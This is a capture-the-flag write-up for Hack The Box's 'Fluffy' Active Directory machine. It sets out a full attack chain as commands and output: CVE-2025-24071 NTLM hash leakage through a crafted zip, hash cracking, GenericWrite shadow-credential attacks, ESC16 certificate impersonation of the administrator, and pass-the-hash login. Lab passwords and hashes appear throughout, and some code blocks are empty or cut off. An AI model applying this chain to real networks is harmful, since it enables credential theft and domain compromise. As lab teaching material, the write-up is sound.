`fluffy` is an assume-breach box where you're given the credentials of `j.fleischman`, for this box I exploited `CVE-2025-24071` to get `p.agila`'s credentials, then I abused a few `GenericWrite`s to work my way up to `winrm_svc` and get the flag, then for the administrator part a certificate authority vulnerable to ESC16 to generate a authentication certificate on behalf of the administrator user

## Recon

I run nmap on the host which found many open ports

```

we have a few things leading to the fact that we're dealing with an active directory domain controller:
- `Simple DNS Plus` which is the typical DNS server in an active directory environment
-  kerberos, ldap and smb
we also get the DNS entry of the domain `fluffy.htb`, and the DC `DC01.fluffy.htb`

I run `nxc` to generate the hosts file for me
```bash
nxc smb 10.10.11.69 --generate-hosts-file /etc/hosts
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) (Null Auth:True)
```

which generates the following
``` bash
10.10.11.69     DC01.fluffy.htb fluffy.htb DC0
```

## p.agila

I used the credentials initially given to me to enumerate the shares, where I found an `IT` shares with `READ,WRITE` permissions

```
$ nxc smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares

upon connection to the share I found an `Upgrade_Notice.pdf`

the PDF mentioned a few vulnerabilities out target system was suffering from, an interesting one is CVE-2025-24071

![fluffy_upgrade_notice.png.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/fluffy/fluffy_upgrade_notice.png)

### CVE-2025-24071
I bit of googling reveals the following about the CVE
```
CVE-2025-24071 is a vulnerability in Windows File Explorer that allows unauthorized access to sensitive information
...
The issue arises from the implicit trust and automatic file parsing behavior of `.library-ms` files in Windows Explorer. An [unauthenticated] attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash
```

I found this [nice POC](https://github.com/0x6rss/CVE-2025-24071_PoC) that let me generate a malicious file which will send an authentication request back to my machine, then we could use `responder` tool to catch it and extract the `NTLM` hash of the user sending it

```bash
[ arch@jeff | ~/CVE-2025-24071_PoC ] (main)
$ ls
poc.py  README.md
[ arch@jeff | ~/CVE-2025-24071_PoC ] (main)
$ python poc.py
Enter your file name: exploit.zip
Enter IP (EX: 192.168.1.162): 10.10.14.3
completed
(01:16:14) [ arch@jeff | ~/CVE-2025-24071_PoC ] (main)
$ ls
exploit.zip  poc.py  README.md
```

we can see `exploit.zip` being created, which if we examine it, we'll find `exploit.zip.library-ms` inside, which indeed points to our IP

```bash
$ unzip exploit.zip
Archive:  exploit.zip
  inflating: exploit.zip.library-ms
[ arch@jeff | ~/CVE-2025-24071_PoC ] (main)
$ cat exploit.zip.library-ms

```

I uploaded this file to `IT` share since it's writable, then watched to see `p.agila`'s NTML hash appear in my terminal

```bash
$ sudo responder -I tun0 -v

```

then I used `john` to crack the hash and recover `p.agila`'s password

```bash
john agila.ntlm --wordlist=rockyou.txt

## winrm_svc

I obtained a `TGT` for `p.agila` and used it to run `bloodhound-python` 

```bash

```

sending the result to bloodhound, I found that `p.agila` has `genericAll` on `service accounts` group, so I used it to add `p.agilla` to that group

```bash
$ net rpc group addmem "service accounts" p.agila -U 'fluffy.htb/p.agila%prometheusx-303' -S DC01.fluffy.htb
```

I could then can check that the account was successfully added

```bash
$ net rpc group members "service accounts" -U "fluffy.htb/p.agila%prometheusx-303" -S DC01.fluffy.htb
Cant load /etc/samba/smb.conf - run testparm to debug it
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

from here, the group `service accounts` has a `genericWrite` on the users `CA_SVC`, `LDAP_SVC` and `WINRM_SVC`, the latter was a part of the `remote management users` group, so I targeted him first

![winrm_svc_genericWrite.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/fluffy/winrm_svc_genericWrite.png)

I exploited the `GenericWrite` by performing a shadow credentials attack to get `WINRM_SVC` ntlm hash

```bash
certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc -dc-ip 10.10.11.69

then we can login with the hash to get the flag

## Administrator

since we still have `genericWrite` on 2 users, I went back to bloodhound to see if they're of any value to me, then I found that `CA_SVC` is a member of the `ca publishers` group, which hints on the presence of the beloved ADCS

since `p.agila` is also a member of that group now, I used her account perform another shadow credentials attack to get `CA_SVC`'s hash. I could also have done it with `winrm_svc` now that I have its NT hash


```

then I used `certipy` to scan for vulnerable certificate templates, and I found the CA to be vulnerable to `ESC16` instead, so all generated certificates will be vulnerable as well

### a bit about ESC16

according to the [amazing Certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), the `1.3.6.1.4.1.311.25.2` security extension aka `szOID_NTDS_CA_SECURITY_EXT`
is vital for is vital for `strong certificate mapping`, enabling DCs to reliably map a certificate to a user or computer account's SID for authentication. when it's disabled on the certificate authority, all generated certificates will lack this SID security extension, making them all behave as if they were configured with `CT_FLAG_NO_SECURITY_EXTENSION` flag enabling `weak certificate mapping` in the domain controllers, thus falling back to weaker, legacy certificate mapping methods (e.g., based on UPN or DNS name found in the certificate's SAN)

all of this just means that if we have write access to an account with enrollment rights, we can change it's UPN to `administrator` then request a certificate for client authentication purposes, and ADCS will happily issue a certificate as if the administrator asked for it, then later we can use it to authenticate as that account, luckily `ca_svc` is a part of the `ca publishers` group and `p.agila` has `GenericWrite` on it  

we can use `certipy` to change the `sa_svc`'s UPN to `administator`

```bash
$ certipy account -u p.agila -p prometheusx-303 -target fluffy.htb -upn administrator -user ca_svc update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

we can check the modification was successfully done, note how the `ca_svc`'s UPN says `administrator` now

```bash
$ certipy account -u p.agila -p prometheusx-303 -target fluffy.htb -upn administrator -user ca_svc read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-09-21T01:06:27+00:00
```

then we can request a certificate to the impersonate the `administrator` account, note how that it got a certificate with UPN `administrator`

```bash
$ certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca fluffy-DC01-CA -upn administrator -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 31
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

we then reverse the UPN change of `ca_svc` user

```bash
$ certipy account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target fluffy.htb -upn ca_svc -user ca_svc update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```

and use the certificate authenticate as `Administrator` and grab his NT hash

```
$ certipy auth -pfx administrator.pfx -u administrator -domain fluffy.htb -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:

```

and finally authenticate to the system using that hash

```bash
$ evil-winrm -i 10.10.11.69 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
